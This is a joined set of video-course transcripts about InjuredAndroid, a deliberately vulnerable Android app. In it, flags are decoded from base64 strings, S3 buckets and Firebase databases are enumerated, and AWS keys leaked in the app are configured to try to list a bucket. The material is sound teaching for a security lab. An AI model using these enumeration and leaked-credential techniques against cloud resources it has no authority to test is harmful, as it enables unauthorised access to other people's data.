00:08:57.730 --> 00:09:00.050
born G, some kind of obfuscated name here.

235
00:09:01.110 --> 00:09:03.830
And we're still doing a comparison though.

236
00:09:03.930 --> 00:09:07.870
So we're comparing our object, which is the

237
00:09:07.870 --> 00:09:10.790
string that we got here from converting our

238
00:09:10.790 --> 00:09:12.250
input to a string, right?

239
00:09:12.350 --> 00:09:15.070
So string object, it's literally right here in

240
00:09:15.070 --> 00:09:16.770
the source code where this is referred to

241
00:09:16.770 --> 00:09:19.570
again, and then we're saying a and it

242
00:09:19.570 --> 00:09:21.590
has something to do with this here.

243
00:09:21.990 --> 00:09:23.990
So let's find out where we can find

244
00:09:23.990 --> 00:09:25.710
this c 146.

245
00:09:25.870 --> 00:09:28.750
One g thing, do a copy and put

246
00:09:28.750 --> 00:09:32.410
this into the magic wand, you can actually

247
00:09:32.410 --> 00:09:34.670
see that we have the flag for activity

248
00:09:34.670 --> 00:09:35.170
here.

249
00:09:35.290 --> 00:09:37.170
And that's where it's referenced in the source

250
00:09:37.170 --> 00:09:37.530
code.

251
00:09:37.970 --> 00:09:40.370
But we also have this, which is kind

252
00:09:40.370 --> 00:09:44.350
of an opposite obfuscated class for our code.

253
00:09:44.490 --> 00:09:46.970
So we have our public class c 146,

254
00:09:47.050 --> 00:09:49.810
one g, and we have this private byte

255
00:09:50.630 --> 00:09:52.310
f 4478.

256
00:09:52.610 --> 00:09:55.510
And that's not referenced here in the flag

257
00:09:55.510 --> 00:09:56.570
for source code.

258
00:09:56.930 --> 00:09:59.730
But this mo 622.

259
00:10:00.070 --> 00:10:02.770
A is so we can actually see that

260
00:10:02.770 --> 00:10:03.350
right here.

261
00:10:03.630 --> 00:10:06.230
So it's doing some kind of a decoding

262
00:10:06.230 --> 00:10:08.770
here, it says base 64 decode.

263
00:10:08.950 --> 00:10:12.490
So let's take this string, we're going to

264
00:10:12.490 --> 00:10:15.430
put this into a cool, cool tool called

265
00:10:15.430 --> 00:10:17.370
cyber chef, if you've never used cyber chef

266
00:10:17.370 --> 00:10:19.930
before, definitely recommend that you go out there

267
00:10:19.930 --> 00:10:22.050
and look at it and convert this from

268
00:10:22.050 --> 00:10:22.950
base 64.

269
00:10:23.710 --> 00:10:27.230
And our flag here is for underscore overdone

270
00:10:27.230 --> 00:10:27.950
omelettes.

271
00:10:28.710 --> 00:10:30.170
So let's actually put that in as our

272
00:10:30.170 --> 00:10:31.530
flag, see if that works.

273
00:10:32.550 --> 00:10:33.230
paste.

274
00:10:33.630 --> 00:10:34.490
And there we go.

275
00:10:34.950 --> 00:10:39.030
So the difference here is that the hard

276
00:10:39.030 --> 00:10:42.670
coded string, not only was this encoded by

277
00:10:42.670 --> 00:10:47.570
using base 64 in a separate class, but

278
00:10:47.570 --> 00:10:49.250
it was also put into a separate class

279
00:10:49.250 --> 00:10:52.750
that was kind of obscurely named, right.

280
00:10:52.990 --> 00:10:55.790
So again, our developer tried to hide this

281
00:10:55.790 --> 00:10:58.050
from us by, you know, naming the class

282
00:10:58.050 --> 00:11:01.290
something weird, like c 1461 g, or maybe

283
00:11:01.290 --> 00:11:03.430
that's just the way that this got decompiled,

284
00:11:03.570 --> 00:11:05.370
got renamed, perhaps by JEDX.

285
00:11:05.650 --> 00:11:08.050
But they also tried to hide this by

286
00:11:08.050 --> 00:11:09.930
using base 64 decoding.

287
00:11:10.490 --> 00:11:13.530
And that's an insecure security practise, because we

288
00:11:13.530 --> 00:11:16.090
were able to reverse this string back to

289
00:11:16.090 --> 00:11:17.610
in its original form.

290
00:11:18.430 --> 00:11:22.170
So here, it's very similar, again, to the

291
00:11:22.170 --> 00:11:24.530
flag one and the flag three activities.

292
00:11:25.210 --> 00:11:27.130
But here, they tried to use a separate

293
00:11:27.130 --> 00:11:29.410
class to bring that string in, you might

294
00:11:29.410 --> 00:11:31.750
actually see that in an application as well.

295
00:11:32.130 --> 00:11:34.150
Alright, so this is all that I have

296
00:11:34.150 --> 00:11:36.490
for our static analysis exploitation.

297
00:11:36.910 --> 00:11:39.170
In the next video, we're going to do

298
00:11:39.170 --> 00:11:43.430
the other flags here, the AWS flags, and

299
00:11:43.430 --> 00:11:44.470
the Firebase flags.

300
00:11:44.750 --> 00:11:47.090
These two flags have a little bit more

301
00:11:47.090 --> 00:11:50.410
of a methodology and reconnaissance behind them, compared

302
00:11:50.410 --> 00:11:52.270
to these flags that we just solved, where

303
00:11:52.270 --> 00:11:53.790
we kind of just did it straight through.

304
00:11:54.410 --> 00:11:56.610
So each one of those next flags is

305
00:11:56.610 --> 00:11:58.530
going to be its own separate video.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.600 --> 00:00:02.840
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's get started with the AWS flag

2
00:00:02.840 --> 00:00:04.920
in the injured Android application.

3
00:00:05.440 --> 00:00:07.740
Now, I've been trying to exploit this flag

4
00:00:07.740 --> 00:00:10.340
outside of these videos, and right now it's

5
00:00:10.340 --> 00:00:12.600
not possible using the tools that I've used

6
00:00:12.600 --> 00:00:15.079
to find the storage bucket, and I've also

7
00:00:15.079 --> 00:00:18.020
tried to use the AWS ID and secret

8
00:00:18.020 --> 00:00:20.480
key found in the application, but it's not

9
00:00:20.480 --> 00:00:22.220
letting me access the bucket either.

10
00:00:22.840 --> 00:00:25.700
So, there will be failure at the end

11
00:00:25.700 --> 00:00:27.540
of this video in terms of getting the

12
00:00:27.540 --> 00:00:30.820
flag, because something has changed with the application

13
00:00:30.820 --> 00:00:32.780
where they must have changed the secret ID,

14
00:00:33.280 --> 00:00:36.900
or possibly removed the bucket from existence.

15
00:00:38.020 --> 00:00:40.620
But the tools and the methodology that I'm

16
00:00:40.620 --> 00:00:42.200
going to be teaching in this video are

17
00:00:42.200 --> 00:00:44.180
still going to apply if you find some

18
00:00:44.180 --> 00:00:47.460
information about AWS in your mobile application.

19
00:00:48.200 --> 00:00:49.780
So, here I'm going to click flag 8

20
00:00:49.780 --> 00:00:54.220
for the login activity here, says AWS CLI

21
00:00:54.220 --> 00:00:56.580
in the AWS profiles and credentials.

22
00:00:56.580 --> 00:00:59.120
If we think back to the source code,

23
00:00:59.340 --> 00:01:01.980
where did we actually find some things about

24
00:01:01.980 --> 00:01:02.500
AWS?

25
00:01:03.319 --> 00:01:05.380
And we actually found this in the strings

26
00:01:05.380 --> 00:01:08.340
.xml if you remember from that video, and

27
00:01:08.340 --> 00:01:10.640
it's this very first two strings here, the

28
00:01:10.640 --> 00:01:13.460
AWS ID and the AWS secret key.

29
00:01:13.980 --> 00:01:17.240
These can actually be utilized to access resources

30
00:01:17.240 --> 00:01:19.620
that are stored out there on AWS.

31
00:01:20.380 --> 00:01:21.840
If we go to the flag 8 login

32
00:01:21.840 --> 00:01:24.120
activity to actually see the source code here,

33
00:01:25.060 --> 00:01:28.900
there's not really any direct URL here for

34
00:01:28.900 --> 00:01:31.060
our storage bucket.

35
00:01:31.840 --> 00:01:33.760
Now, a tool that we can use, and

36
00:01:33.760 --> 00:01:35.720
I'm going to use Kali Linux for this

37
00:01:35.720 --> 00:01:39.140
example, is a tool called Cloud Enum.

38
00:01:39.400 --> 00:01:41.420
How we can find this, I'm already on

39
00:01:41.420 --> 00:01:43.840
the page on GitHub, but obviously you can

40
00:01:43.840 --> 00:01:46.660
always go to Google and just look for

41
00:01:46.660 --> 00:01:51.720
cloud underscore enumeration here, and it's init string

42
00:01:51.720 --> 00:01:52.880
on GitHub.

43
00:01:53.500 --> 00:01:56.140
And the nice thing about this tool, if

44
00:01:56.140 --> 00:01:58.520
we're looking through the documentation here, is it

45
00:01:58.520 --> 00:02:01.780
allows us to enumerate the name of whatever

46
00:02:01.780 --> 00:02:05.960
we're looking for on AWS, Microsoft, Azure, and

47
00:02:05.960 --> 00:02:08.020
also the Google Cloud Platform.

48
00:02:08.419 --> 00:02:10.240
So this is really nice because it allows

49
00:02:10.240 --> 00:02:13.320
us to hit the top three cloud providers,

50
00:02:13.400 --> 00:02:15.080
at least here in the United States.

51
00:02:16.040 --> 00:02:18.400
So let's actually go ahead and get this

52
00:02:18.400 --> 00:02:19.240
tool installed.

53
00:02:19.240 --> 00:02:21.960
I'm going to click code here and copy

54
00:02:21.960 --> 00:02:24.280
this URL and open my terminal.

55
00:02:24.860 --> 00:02:26.620
I'm going to do a git clone in

56
00:02:26.620 --> 00:02:27.400
Kali Linux.

57
00:02:28.980 --> 00:02:31.120
Git is already installed by default.

58
00:02:31.380 --> 00:02:33.080
Depending on your setup, you might need to

59
00:02:33.080 --> 00:02:35.920
install git yourself before you actually download this

60
00:02:35.920 --> 00:02:36.260
tool.

61
00:02:36.460 --> 00:02:38.320
Tons of tutorials out there on the internet.

62
00:02:39.000 --> 00:02:41.020
And also the cool thing about Cloud Enum

63
00:02:41.020 --> 00:02:42.380
is that it's going to run on any

64
00:02:42.380 --> 00:02:43.440
operating system.

65
00:02:43.440 --> 00:02:48.480
So you can use this on any platform

66
00:02:48.480 --> 00:02:50.680
that you want, Mac, Windows, etc.

67
00:02:50.980 --> 00:02:53.120
You're going to need Python, and you're going

68
00:02:53.120 --> 00:02:54.900
to need to install the requirements like I'm

69
00:02:54.900 --> 00:02:56.320
about to do in this video.

70
00:02:56.680 --> 00:02:58.380
I'm going to do a cd now since

71
00:02:58.380 --> 00:03:01.160
this directory has downloaded to the Cloud Enum

72
00:03:01.160 --> 00:03:01.720
directory.

73
00:03:01.960 --> 00:03:04.120
Do a little ls to see what's here.

74
00:03:04.600 --> 00:03:06.160
All we need to do now is a

75
00:03:06.160 --> 00:03:12.460
pip3 install-r requirements.txt. Now in my

76
00:03:12.460 --> 00:03:15.380
case, I've already installed these pip requirements, but

77
00:03:15.380 --> 00:03:17.300
it might take a few seconds to install

78
00:03:17.300 --> 00:03:17.600
them.

79
00:03:17.940 --> 00:03:19.900
Now we should be good to run our

80
00:03:19.900 --> 00:03:20.220
tool.

81
00:03:20.680 --> 00:03:22.660
And if we look at the documentation on

82
00:03:22.660 --> 00:03:24.980
GitHub and scroll down a little bit more,

83
00:03:26.360 --> 00:03:30.640
we can see that the format for commands

84
00:03:30.640 --> 00:03:34.240
here, it's like cloudenum.py tech k, then

85
00:03:34.240 --> 00:03:35.520
the name of our company.

86
00:03:35.920 --> 00:03:37.520
So the cool thing about this is when

87
00:03:37.520 --> 00:03:39.560
you're doing like a live hunt through the

88
00:03:39.560 --> 00:03:42.180
cloud, you can add multiple company names.

89
00:03:42.320 --> 00:03:44.500
So maybe your company has a few affiliates,

90
00:03:44.720 --> 00:03:47.140
or maybe it has a few different URLs

91
00:03:47.140 --> 00:03:48.680
or websites that it goes by.

92
00:03:48.880 --> 00:03:51.620
You can specify a bunch of keywords here

93
00:03:51.620 --> 00:03:53.660
to go out and try to scrape for

94
00:03:53.660 --> 00:03:54.960
different cloud resources.

95
00:03:55.620 --> 00:03:59.460
So I'm going to do python3 and then

96
00:03:59.460 --> 00:04:02.620
cloudenum.py dash k.

97
00:04:02.800 --> 00:04:04.200
And here we're going to look for the

98
00:04:04.200 --> 00:04:05.160
keyword Android.

99
00:04:06.960 --> 00:04:08.960
And like I mentioned at the beginning of

100
00:04:08.960 --> 00:04:10.760
the video, we're actually not going to find

101
00:04:10.760 --> 00:04:11.520
anything here.

102
00:04:12.020 --> 00:04:13.880
Now, when I was testing this a few

103
00:04:13.880 --> 00:04:15.920
weeks ago, it did work just fine and

104
00:04:15.920 --> 00:04:17.760
it brought up a bunch of just one

105
00:04:17.760 --> 00:04:18.620
S3 bucket.

106
00:04:19.040 --> 00:04:21.060
The name of that S3 bucket was Injured

107
00:04:21.060 --> 00:04:21.400
Android.

108
00:04:22.020 --> 00:04:23.220
You're going to see here we're getting a

109
00:04:23.220 --> 00:04:25.660
bunch of different connection errors as it tries.

110
00:04:26.160 --> 00:04:28.820
But you can see that basically it's trying

111
00:04:28.820 --> 00:04:31.600
a bunch of different variations of this kind

112
00:04:31.600 --> 00:04:34.400
of URL here and looking for any type

113
00:04:34.400 --> 00:04:35.360
of storage buckets.

114
00:04:35.360 --> 00:04:37.680
So we have like JS Injured Android dot

115
00:04:37.680 --> 00:04:40.980
S3 dot Amazon AWS, et cetera, et cetera,

116
00:04:41.080 --> 00:04:43.660
until it goes through the entire file of

117
00:04:43.660 --> 00:04:44.340
different names.

118
00:04:44.500 --> 00:04:46.380
And it's going to do that not only

119
00:04:46.380 --> 00:04:48.780
for AWS if we go down here, but

120
00:04:48.780 --> 00:04:50.800
it's also going to look not only for

121
00:04:50.800 --> 00:04:54.180
storage buckets, but for AWS apps, as well

122
00:04:54.180 --> 00:04:56.440
as things in Azure and Google Cloud.

123
00:04:56.540 --> 00:04:59.020
So these can definitely be something useful if

124
00:04:59.020 --> 00:05:01.160
you're trying to gain an understanding of all

125
00:05:01.160 --> 00:05:03.440
the different cloud resources that a company might

126
00:05:03.440 --> 00:05:03.860
have.

127
00:05:03.860 --> 00:05:05.800
For now, I'm going to cancel this scan

128
00:05:05.800 --> 00:05:07.480
because I know nothing's going to come up.

129
00:05:07.780 --> 00:05:09.360
But you would want to let this run

130
00:05:09.360 --> 00:05:11.440
for probably 10 or 15 minutes to try

131
00:05:11.440 --> 00:05:13.240
to get everything that you possibly could.

132
00:05:14.040 --> 00:05:17.420
OK, and let's say, for example, that I

133
00:05:17.420 --> 00:05:20.440
actually had a cloud resource come back.

134
00:05:20.700 --> 00:05:22.320
And in our case, it would just be

135
00:05:22.320 --> 00:05:26.860
named Injured Android dot S3 dot Amazon AWS

136
00:05:26.860 --> 00:05:28.480
dot com.

137
00:05:28.520 --> 00:05:30.100
This would be the name of our storage

138
00:05:30.100 --> 00:05:30.400
bucket.

139
00:05:30.400 --> 00:05:32.120
And this is what I actually found in

140
00:05:32.120 --> 00:05:33.740
the past when I was messing with this

141
00:05:33.740 --> 00:05:34.380
application.

142
00:05:34.980 --> 00:05:37.040
So this would be like the name of

143
00:05:37.040 --> 00:05:37.580
our bucket.

144
00:05:38.140 --> 00:05:41.520
And to actually gain access to these resources,

145
00:05:42.860 --> 00:05:46.480
we can use something called the AWS CLI.

146
00:05:46.800 --> 00:05:48.440
With Linux, this is very easy.

147
00:05:48.560 --> 00:05:49.940
Let me clear out my screen here.

148
00:05:50.400 --> 00:05:52.440
We're just going to do a sudo apt

149
00:05:52.440 --> 00:05:57.220
-get install AWS CLI.

150
00:05:57.220 --> 00:06:00.560
I do let that just install for a

151
00:06:00.560 --> 00:06:01.180
few seconds.

152
00:06:02.000 --> 00:06:04.560
And once this installs successfully, now we'll be

153
00:06:04.560 --> 00:06:07.540
able to actually trigger AWS commands from the

154
00:06:07.540 --> 00:06:10.040
command line here by just using AWS.

155
00:06:10.380 --> 00:06:11.920
It's going to bring up the manual here.

156
00:06:12.040 --> 00:06:13.420
And that's how you know that this tool

157
00:06:13.420 --> 00:06:14.880
has installed correctly.

158
00:06:15.360 --> 00:06:19.280
Now, in our case, we have a client

159
00:06:19.280 --> 00:06:21.640
ID and a secret key that we've obtained

160
00:06:21.640 --> 00:06:22.940
from our source code, right?

161
00:06:23.120 --> 00:06:25.380
So if we look in JADX again, we

162
00:06:25.380 --> 00:06:28.940
have our AWS ID and our AWS secret.

163
00:06:29.400 --> 00:06:31.940
We can actually configure these as credentials to

164
00:06:31.940 --> 00:06:33.160
use through AWS.

165
00:06:33.580 --> 00:06:35.520
We're going to do AWS configure.

166
00:06:37.840 --> 00:06:40.500
And we're going to do tactac profile and

167
00:06:40.500 --> 00:06:42.520
name our profile injured android.

168
00:06:42.860 --> 00:06:44.540
So this is useful if you're going to

169
00:06:44.540 --> 00:06:47.920
have multiple profiles that you're going to be

170
00:06:47.920 --> 00:06:52.680
using as part of your AWS exploitation.

171
00:06:53.140 --> 00:06:54.980
So if you're doing like multiple bug bounties

172
00:06:54.980 --> 00:06:57.300
or you have some reason to access multiple

173
00:06:57.300 --> 00:07:01.160
AWS resources, you have different profiles with different

174
00:07:01.160 --> 00:07:05.520
AWS IDs and IAWS secret keys in them.

175
00:07:06.780 --> 00:07:09.440
So now we're going to specify the AWS

176
00:07:09.440 --> 00:07:10.440
key ID.

177
00:07:10.900 --> 00:07:12.420
So we're going to take that directly out

178
00:07:12.420 --> 00:07:14.160
of the strings.xml here.

179
00:07:15.280 --> 00:07:18.300
Copy that and paste it into our Kali

180
00:07:18.300 --> 00:07:19.000
Linux terminal.

181
00:07:21.580 --> 00:07:24.220
And now we're going to specify the secret

182
00:07:24.220 --> 00:07:26.300
ID, which again can be found in the

183
00:07:26.300 --> 00:07:27.140
same spot.

184
00:07:31.040 --> 00:07:33.120
And paste that into our Kali terminal.

185
00:07:33.900 --> 00:07:35.800
I'm just going to say none for the

186
00:07:35.800 --> 00:07:38.360
region and none for our default output format.

187
00:07:38.700 --> 00:07:40.500
Now how we would try to get access

188
00:07:40.500 --> 00:07:42.040
to this AWS bucket.

189
00:07:42.380 --> 00:07:44.460
When we're running Cloudynuum, we would see that

190
00:07:44.460 --> 00:07:47.160
this bucket is actually open for anyone to

191
00:07:47.160 --> 00:07:47.700
read to.

192
00:07:47.800 --> 00:07:50.220
So we can do AWS S3.

193
00:07:50.360 --> 00:07:52.700
So we're trying to access an S3 bucket.

194
00:07:53.200 --> 00:07:54.780
LS, which means we're going to try to

195
00:07:54.780 --> 00:07:57.560
list the file system contents of the S3

196
00:07:57.560 --> 00:07:57.940
bucket.

197
00:07:58.360 --> 00:08:01.020
We're going to do S3 colon slash slash.

198
00:08:01.600 --> 00:08:02.720
And it's going to be just like a

199
00:08:02.720 --> 00:08:03.420
normal URL.

200
00:08:03.780 --> 00:08:05.440
Here I'm just going to do injured android.

201
00:08:05.920 --> 00:08:08.600
And now I'm going to specify my profile

202
00:08:08.600 --> 00:08:10.400
just because I prefer to do that.

203
00:08:11.420 --> 00:08:14.320
So we have our profile injured android, which

204
00:08:14.320 --> 00:08:16.060
we just set up in the previous command.

205
00:08:16.500 --> 00:08:17.380
I'm going to click enter.

206
00:08:18.240 --> 00:08:20.280
And here we're going to get a access

207
00:08:20.280 --> 00:08:21.660
denied issue here.

208
00:08:22.120 --> 00:08:23.780
And this is the problem that I ran

209
00:08:23.780 --> 00:08:26.240
into when I was trying to do this

210
00:08:26.240 --> 00:08:28.760
exploit outside of these videos.

211
00:08:29.320 --> 00:08:31.080
But this is the exact format that you

212
00:08:31.080 --> 00:08:33.559
would actually use if the bucket was actually

213
00:08:33.559 --> 00:08:37.340
accessible and if you found an open bucket

214
00:08:37.340 --> 00:08:38.600
for your application.

215
00:08:38.980 --> 00:08:40.960
So I hope this video was useful and

216
00:08:40.960 --> 00:08:42.659
taught you how to go out there and

217
00:08:42.659 --> 00:08:44.440
scan for some cloud resources.

218
00:08:45.100 --> 00:08:47.440
And in particular, teach you how to access

219
00:08:47.440 --> 00:08:50.300
this S3 bucket if it actually existed out

220
00:08:50.300 --> 00:08:52.560
there and worked with the credentials that were

221
00:08:52.560 --> 00:08:53.000
provided.

222
00:08:53.000 --> 00:08:55.480
I think the developer for injured android might

223
00:08:55.480 --> 00:08:56.720
have changed these credentials.

224
00:08:57.120 --> 00:08:59.300
So the exploit does not work in this

225
00:08:59.300 --> 00:08:59.680
case.

226
00:09:00.060 --> 00:09:01.760
I'll see you in the next video for

227
00:09:01.760 --> 00:09:04.280
our Firebase enumeration and exploitation.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:03.110
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's talk now about the Firebase activity.

2
00:00:03.290 --> 00:00:04.710
This is gonna be kind of similar to

3
00:00:04.710 --> 00:00:07.270
the format that we used for the AWS

4
00:00:07.270 --> 00:00:08.530
activity as well.

5
00:00:08.970 --> 00:00:11.210
So let me click the Firebase activity here.

6
00:00:11.810 --> 00:00:14.170
It says use the .json trick with database

7
00:00:14.170 --> 00:00:14.690
URL.

8
00:00:15.370 --> 00:00:17.530
Also something about file names.

9
00:00:17.930 --> 00:00:19.230
So if we go back to our source

10
00:00:19.230 --> 00:00:21.910
code and we look in our strings.xml

11
00:00:21.910 --> 00:00:23.830
again, what was one of the URLs that

12
00:00:23.830 --> 00:00:25.890
we found that was pretty interesting for this

13
00:00:25.890 --> 00:00:26.530
application?

14
00:00:27.210 --> 00:00:33.190
That was this HTTPS injuredandroid.firebase.io.com.

15
00:00:33.550 --> 00:00:36.190
I'm gonna copy and paste this into my

16
00:00:36.190 --> 00:00:37.950
browser here in Kali Linux.

17
00:00:41.520 --> 00:00:43.860
And we see it's prompting here for our

18
00:00:43.860 --> 00:00:44.560
Google account.

19
00:00:44.680 --> 00:00:47.200
So this actually needs some form of authentication

20
00:00:47.200 --> 00:00:49.020
to get access to it.

21
00:00:49.480 --> 00:00:51.960
But if we look into our source code,

22
00:00:52.040 --> 00:00:54.740
we'll actually find part of this Firebase database

23
00:00:54.740 --> 00:00:55.960
that is exposed.

24
00:00:56.480 --> 00:00:58.740
But before we do that, I also wanna

25
00:00:58.740 --> 00:01:01.740
talk about how we can actually enumerate Firebase

26
00:01:01.740 --> 00:01:03.900
databases for our application.

27
00:01:04.500 --> 00:01:06.580
So very similarly to that tool that we

28
00:01:06.580 --> 00:01:09.820
just used called Cloud Enum, there's also a

29
00:01:09.820 --> 00:01:11.960
tool called Firebase Enum.

30
00:01:13.440 --> 00:01:16.660
And this is available on GitHub as well.

31
00:01:16.860 --> 00:01:20.880
You can see it's under sample 0xfirebaseenum, tool

32
00:01:20.880 --> 00:01:23.040
to mass analyze Firebase databases.

33
00:01:23.940 --> 00:01:26.480
It's very similar to what you used for

34
00:01:26.480 --> 00:01:28.660
Cloud Enum.

35
00:01:29.040 --> 00:01:30.740
The difference here is that this is gonna

36
00:01:30.740 --> 00:01:33.080
be specifically looking for Firebase databases.

37
00:01:34.020 --> 00:01:37.040
And something interesting about this application as well

38
00:01:37.040 --> 00:01:40.700
is it's actually able to pull applications automatically

39
00:01:40.700 --> 00:01:44.560
off of a website called apkpure.com, which

40
00:01:44.560 --> 00:01:47.420
is used for if you want to get

41
00:01:47.420 --> 00:01:49.980
an APK out of a third-party source

42
00:01:49.980 --> 00:01:54.100
like APK Pure, as opposed to the Google

43
00:01:54.100 --> 00:01:54.740
Play Store.

44
00:01:55.840 --> 00:01:58.640
But this can actually pull things based on

45
00:01:58.640 --> 00:01:59.860
categories here.

46
00:02:00.020 --> 00:02:01.840
So if you have a bunch of finance

47
00:02:01.840 --> 00:02:05.160
applications, you can actually pull multiple pages of

48
00:02:05.160 --> 00:02:06.360
those finance applications.

49
00:02:07.120 --> 00:02:09.539
And this tool will actually automatically look through

50
00:02:09.539 --> 00:02:12.460
there for different Firebase databases that might be

51
00:02:12.460 --> 00:02:17.460
specified in those applications.

52
00:02:18.000 --> 00:02:20.260
So we can actually do a mass analysis

53
00:02:20.260 --> 00:02:22.400
of a bunch of different applications using this

54
00:02:22.400 --> 00:02:23.520
tool if we would like to.

55
00:02:23.980 --> 00:02:26.740
We can also still use the keyword functionality

56
00:02:26.740 --> 00:02:27.520
like here.

57
00:02:27.920 --> 00:02:29.320
So this is possible to search for a

58
00:02:29.320 --> 00:02:31.420
company by using the dash K.

59
00:02:31.860 --> 00:02:33.900
So I'm gonna install this tool just as

60
00:02:33.900 --> 00:02:34.880
an example here.

61
00:02:35.140 --> 00:02:36.700
I do a copy.

62
00:02:38.000 --> 00:02:39.920
And I'm gonna do a git clone again.

63
00:02:40.900 --> 00:02:42.800
Actually clear this window out.

64
00:02:43.720 --> 00:02:47.880
Git clone and paste our string that we

65
00:02:47.880 --> 00:02:48.340
got there.

66
00:02:48.480 --> 00:02:48.740
Oops.

67
00:02:51.480 --> 00:02:53.280
Guess that did not copy properly.

68
00:02:58.000 --> 00:02:59.540
Make sure we get it this time.

69
00:03:00.560 --> 00:03:01.940
Paste that into the terminal.

70
00:03:03.140 --> 00:03:06.280
Okay, it's gonna make the Firebase enum directory

71
00:03:06.280 --> 00:03:06.720
now.

72
00:03:07.380 --> 00:03:09.880
CD to that directory, do an ls.

73
00:03:10.020 --> 00:03:12.480
And again, kind of similarly to Cloud Enum,

74
00:03:12.820 --> 00:03:16.860
we're gonna do a pip3 install, type our

75
00:03:16.860 --> 00:03:20.480
requirements.txt. It'll go up there.

76
00:03:21.000 --> 00:03:22.780
I already have the requirements installed.

77
00:03:22.780 --> 00:03:24.940
So now let's actually run this tool.

78
00:03:25.080 --> 00:03:29.180
I'm gonna do a python3 firebaseenum.py. And

79
00:03:29.180 --> 00:03:31.380
here I'm gonna do tech K and then

80
00:03:31.380 --> 00:03:35.560
do injured Android again for our Firebase database.

81
00:03:36.140 --> 00:03:38.420
And it's gonna do something very similar to

82
00:03:38.420 --> 00:03:41.020
Cloud Enum and check for those open Firebase

83
00:03:41.020 --> 00:03:41.660
databases.

84
00:03:42.120 --> 00:03:45.060
Again, you can use this with the APK

85
00:03:45.060 --> 00:03:48.280
tool or APK pure usage as mentioned in

86
00:03:48.280 --> 00:03:49.520
the documents as well.

87
00:03:49.680 --> 00:03:51.620
So this is just a really nice and

88
00:03:51.620 --> 00:03:53.800
useful tool that you can use if you're

89
00:03:53.800 --> 00:03:55.780
doing like a bug bounty hunt against a

90
00:03:55.780 --> 00:03:57.800
company, you're trying to find all of their

91
00:03:57.800 --> 00:03:59.520
different Firebase databases.

92
00:03:59.940 --> 00:04:02.140
So let's see if this brings anything back

93
00:04:02.140 --> 00:04:02.480
here.

94
00:04:02.920 --> 00:04:05.380
We do already have the URL from our

95
00:04:05.380 --> 00:04:06.160
static analysis.

96
00:04:06.320 --> 00:04:07.900
So it's not a big deal if it

97
00:04:07.900 --> 00:04:08.860
doesn't find anything.

98
00:04:10.020 --> 00:04:12.380
So let's actually look at the source code

99
00:04:12.380 --> 00:04:15.019
for that activity while we wait for that

100
00:04:15.019 --> 00:04:16.019
scan to finish.

101
00:04:17.180 --> 00:04:20.000
So I'm gonna go to the source code.

102
00:04:20.000 --> 00:04:22.980
And this is our flag nine activity, flag

103
00:04:22.980 --> 00:04:24.300
nine Firebase activity.

104
00:04:24.840 --> 00:04:27.940
And we see this string here seems to

105
00:04:27.940 --> 00:04:28.860
be kind of weird.

106
00:04:29.500 --> 00:04:33.780
Use the .json trick with database URL and

107
00:04:33.780 --> 00:04:34.940
scroll down a bit more.

108
00:04:35.180 --> 00:04:38.940
Something about base 64 decoding is on here.

109
00:04:40.520 --> 00:04:44.340
Yeah, decoded directory base 64 decode and something

110
00:04:44.340 --> 00:04:45.180
about this.

111
00:04:45.280 --> 00:04:48.280
So let's actually see what this URL decodes

112
00:04:48.280 --> 00:04:48.600
to.

113
00:04:49.160 --> 00:04:52.400
Go back to CyberChef here, replace our string.

114
00:04:53.720 --> 00:04:56.020
And this decodes to something like a directory

115
00:04:56.020 --> 00:04:57.380
that looks like flags.

116
00:04:58.240 --> 00:05:03.440
So if we go back to our Google

117
00:05:03.440 --> 00:05:07.560
Chrome here, we had our Firebase database.

118
00:05:09.080 --> 00:05:17.680
It was named injured android firebase.io here.

119
00:05:17.880 --> 00:05:18.860
I'm gonna click this.

120
00:05:22.800 --> 00:05:24.400
I'm gonna copy that back out of the

121
00:05:24.400 --> 00:05:25.040
source code.

122
00:05:26.640 --> 00:05:33.570
Just go to the strings.xml again and

123
00:05:33.570 --> 00:05:35.830
just copy that Firebase URL one more time.

124
00:05:38.230 --> 00:05:39.010
Go back here.

125
00:05:39.210 --> 00:05:41.310
Okay, so a trick that we can use

126
00:05:41.310 --> 00:05:44.290
for Firebase is do a slash.json at

127
00:05:44.290 --> 00:05:44.650
the end.

128
00:05:45.110 --> 00:05:46.550
When I do this, we get a permission

129
00:05:46.550 --> 00:05:47.150
denied.

130
00:05:47.550 --> 00:05:51.330
But we pulled that base 64 string out

131
00:05:51.330 --> 00:05:52.670
of an application as well.

132
00:05:52.730 --> 00:05:53.630
And it looked like a directory.

133
00:05:53.870 --> 00:05:55.790
So what if we actually add the firebase

134
00:05:55.790 --> 00:05:57.430
.io to the flags directory here?

135
00:05:58.090 --> 00:05:59.830
And we actually get the flag out of

136
00:05:59.830 --> 00:06:00.270
here, right?

137
00:06:00.590 --> 00:06:02.490
So what we learned from this is that

138
00:06:02.490 --> 00:06:05.550
some portions of a Firebase database can actually

139
00:06:05.550 --> 00:06:06.310
be protected.

140
00:06:07.030 --> 00:06:08.670
So like for example, when we did not

141
00:06:08.670 --> 00:06:13.550
use this directory, the Firebase database appears to

142
00:06:13.550 --> 00:06:14.830
be protected.

143
00:06:15.170 --> 00:06:18.610
But when we actually use this directory here,

144
00:06:18.870 --> 00:06:21.090
this specific area is not.

145
00:06:21.510 --> 00:06:23.410
So this is something to keep in mind

146
00:06:23.410 --> 00:06:25.870
if you're using Firebase throughout an application.

147
00:06:26.370 --> 00:06:28.490
Maybe there are certain areas that are protected

148
00:06:28.490 --> 00:06:29.370
versus not.

149
00:06:29.750 --> 00:06:31.150
So let's go back and look at our

150
00:06:31.150 --> 00:06:33.810
Firebase Enum tool, see if it actually got

151
00:06:33.810 --> 00:06:34.890
anything back here.

152
00:06:35.830 --> 00:06:37.050
You can see it looked for like a

153
00:06:37.050 --> 00:06:40.370
bunch of different variations here with injured Android

154
00:06:40.370 --> 00:06:40.830
in there.

155
00:06:41.970 --> 00:06:44.910
And actually didn't find anything in particular.

156
00:06:47.290 --> 00:06:49.590
So, I mean, this kind of a tool

157
00:06:49.590 --> 00:06:52.050
is not always gonna find something depending on

158
00:06:52.050 --> 00:06:53.750
what you're looking for and depending on the

159
00:06:53.750 --> 00:06:55.130
keywords that you supply too.

160
00:06:55.730 --> 00:06:58.190
But that's why static analysis is also important.

161
